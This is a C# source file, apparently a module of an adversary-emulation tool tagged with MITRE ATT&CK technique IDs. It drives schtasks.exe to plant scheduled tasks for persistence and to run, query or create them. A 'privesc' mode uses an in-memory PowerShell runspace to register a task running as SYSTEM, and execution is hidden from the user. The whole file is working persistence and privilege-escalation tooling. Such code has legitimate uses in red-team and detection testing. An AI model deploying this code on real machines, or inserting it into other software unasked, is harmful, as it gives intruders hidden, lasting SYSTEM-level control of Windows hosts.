using System;
using System.Collections.Generic;
using System.Management.Automation.Runspaces;
using System.IO;


class Technique {
    public static Dictionary<string, string> EntryData { get; set; }
    public static Dictionary<string, string> ExitData { get; set; }

    //bool IsElevated = new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);

    public static bool usePowershellWithoutPowershell(string[] args) {
        try {
            string binToRun = Path.GetDirectoryName(args[2]).Length > 0 ? args[2] : String.Format("{0}{1}", Environment.SystemDirectory, "\\" + args[2]);
            string command;

            RunspaceConfiguration rspacecfg = RunspaceConfiguration.Create();
            Runspace rspace = RunspaceFactory.CreateRunspace(rspacecfg);
            rspace.Open();
            Pipeline pipeline = rspace.CreatePipeline();

            command = "Start-Process schtasks -ArgumentList '/create /tn \"" + args[1] + "\" /tr \"" + binToRun + "\" /sc " + args[3] + " /ru SYSTEM" + (args.Length >= 5 ? " " + args[4] : "");
            command += "' -Verb RunAs";

            Console.Write("[T1087-000] Enter a valid local admin, with your local hostname, e.g.: " + Environment.MachineName + "\\localAdminUsername | .\\localAdminUsername");
            Console.Write("[T1087-000] Running instructions\nPS $> " + command);
            pipeline.Commands.AddScript(command);
            pipeline.Invoke();
            return true;
        } catch (Exception ex) {
            Console.WriteLine("[T1087-000] ERROR powershell in memory: " + ex.Message);
        }
        return false;
    }

    public static bool schedRun(string[] args) {
        try {
            Console.WriteLine("[T1053-005] Setting up arguments on flow");
            string argRun = "";
            switch (args[0].ToLower()) {
                case "persistence":
                    if (args.Length >= 4) {
                        string binToRun = Path.GetDirectoryName(args[2]).Length > 0 ? args[2] : String.Format("{0}{1}", Environment.SystemDirectory, "\\" + args[2]);
                        if (System.IO.File.Exists(binToRun)) {
                            argRun = "/create /tn \"" + args[1] + "\" /tr \"" + binToRun + "\" /sc " + args[3] + " " + (args.Length >= 5 ? args[4] : "");
                            break;
                        } else {
                            Console.WriteLine("[T1053-005] ERROR: File specified in param 3 not found! Try again!");
                            Console.ForegroundColor = ConsoleColor.Yellow;
                            Console.WriteLine("Do you really want to try adding'" + args[2] + "' as binary to run? [Y/n]");
                            Console.ForegroundColor = ConsoleColor.Gray;
                            char choice = Console.ReadKey().KeyChar;
                            string valida = choice.ToString().ToLower();
                            valida = (valida.Trim().Length >= 1 ? valida : "y");
                            if (valida.Equals("y")) {
                                argRun = "/create /tn \"" + args[1] + "\" /tr \"" + args[2] + "\" /sc " + args[3] + " " + (args.Length >= 5 ? args[4] : "");
                            } else {
                                return false;
                            }
                        }
                    } else {
                        Console.WriteLine("[T1053-005] Insert all required params to create a task. View README file and try again!");
                        return false;
                    }
                    break;
                case "exec":
                    if (args.Length >= 2) {
                        argRun = "/run /tn \"" + args[1] + "\" " + (args.Length >= 3 ? args[2] : "");
                        break;
                    } else { Console.WriteLine("[T1053-005] Insert all required params to run a task. View README file and try again!"); return false; }
                case "query":
                    if (args.Length >= 2) {
                        argRun = "/query /tn \"" + args[1] + "\" /fo LIST /v " + (args.Length >= 3 ? args[2] : "");
                        break;
                    } else { Console.WriteLine("[T1053-005] Insert all required params to query a task. View README file and try again!"); return false; }
                case "privesc":
                    if (args.Length >= 4) {
                        return usePowershellWithoutPowershell(args);
                    } else {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\n[!] To try scheduled a task with a privileged user, more parameters are needed in .flow file.\nIf you need help, go to the README and view examples [!]\n");
                        return false;
                    }
                default:
                    Console.WriteLine("[ERROR] Method '" + args[0] + "' not found!");
                    Console.Write("[T1053-005] Try: persistence | exec | query | privesc\n\n");
                    return false;
            }

            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;

            startInfo.FileName = "schtasks.exe";
            startInfo.Arguments = argRun;
            startInfo.RedirectStandardOutput = true;
            startInfo.UseShellExecute = false;
            startInfo.RedirectStandardOutput = true;
            process.StartInfo = startInfo;
            Console.WriteLine("[T1053-005] - Starting schtasks");
            process.Start();
            process.WaitForExit();

            // Show entire output if the module needs to query a scheduled task
            if (args[0].ToLower() == "query") {
                Console.WriteLine("[?] Getting information about scheduled task [?]");
                Console.WriteLine(process.StandardOutput.ReadToEnd());
                Console.WriteLine("[T1053-005] - Query completed!");
            }

            if (process.ExitCode == 0) {
                return true;
            } else {
                Console.WriteLine("[!!!] Something went wrong [!!!] \n" + process.StandardOutput.ReadToEnd() + "\n");
            }
        } catch (Exception ex) {
            Console.WriteLine("[T1053-005] ERROR at schedule run:" + ex.Message);
        }
        return false;
    }

    public static void Main(string[] args) {
        Console.ForegroundColor = ConsoleColor.Green;
        Console.WriteLine("[T1053-005] Started Execution!");
        Console.ForegroundColor = ConsoleColor.Gray;
        Console.WriteLine("[T1053-005] Method used: '" + args[0] + "'");

        if (schedRun(args)) {
            Console.WriteLine("[T1053-005] Module successfully executed!");
        }
    }
}
